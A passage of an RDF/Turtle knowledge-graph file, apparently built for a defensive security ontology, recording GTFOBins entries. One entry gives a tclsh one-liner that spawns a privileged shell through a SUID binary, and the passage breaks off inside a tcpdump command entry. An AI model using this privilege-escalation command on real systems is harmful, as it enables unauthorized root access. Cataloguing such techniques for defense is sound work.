    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tclsh ;
    mknd:provides mknd:function_suid ;
    mknd:value """./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr
""" .

mknd:command_tcpdump-command a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tcpdump-command" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_tcpdump ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tcpdump ;
    mknd:provides mknd:function_command ;
    mknd:value """COMMAND='id'
